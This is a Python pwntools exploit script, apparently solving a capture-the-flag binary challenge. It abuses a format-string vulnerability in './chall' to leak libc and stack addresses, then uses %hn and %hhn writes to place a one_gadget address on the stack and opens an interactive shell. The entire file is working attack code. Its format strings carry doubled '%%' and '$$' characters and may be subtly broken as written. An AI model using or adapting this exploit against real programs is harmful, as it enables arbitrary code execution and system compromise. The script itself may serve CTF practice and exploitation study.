from pwn import *
r = process("./chall")
libc = ELF("./libc.2.23.so")
bina = ELF("./chall")
r.sendlineafter(b'name: ', b'A' * 8)
payload = b'yes' + '%%{}$$p%%{}$$p'.format(1, 11).encode()
r.sendlineafter(b'me?\n', payload)
r.recvuntil(b'yes')
leak = r.recvline()[:-1].decode().split('0x')
libc_addr = int(leak[1], 16) - 131 -  libc.symbols['_IO_2_1_stdout_']
stack_addr = int(leak[2], 16) - 0xd0
cnt_addr = stack_addr - 0x20
log.info(f'leak main address:0x{libc_addr:0x}')
log.info(f'leak stack address:0x{stack_addr:0x}')

payload = b'yes' 
payload += '%%{}x%%{}$$hn'.format(cnt_addr & 0xffff,11 ).encode()
r.sendlineafter(b'me?\n', payload)
payload = b'yes'
payload += '%%{}x%%{}$$hhn'.format(0xff-len(payload), 37).encode()
r.sendlineafter(b'me?\n', payload)

addr = cnt_addr + 0x10
one_gadget = 0x3f3d6 + libc_addr
while one_gadget > 0:
     
    payload = b'yes'
    payload += '%%{}x%%{}$$hn'.format( ( addr & 0xffff) - len(payload), 11).encode() 
    r.sendlineafter(b'me?\n', payload)
    val = one_gadget & 0xff
    payload = b'yes'
    payload += '%%{}x%%{}$$hhn'.format(val -len(payload), 37).encode()
    r.sendlineafter(b'me?\n', payload)
    addr += 1
    one_gadget = one_gadget >> 8

r.interactive()
